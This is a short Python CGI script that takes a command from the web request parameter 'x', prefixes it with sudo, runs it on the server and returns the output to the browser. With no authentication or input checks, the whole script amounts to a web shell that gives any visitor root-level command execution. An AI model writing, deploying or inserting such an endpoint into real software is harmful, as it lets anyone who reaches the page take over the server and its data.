#!/usr/bin/python3
import cgi
import subprocess


print("content-type: text/html")
print()

data = cgi.FieldStorage()
cmd = data.getvalue("x")

print(subprocess.getoutput("sudo " + cmd))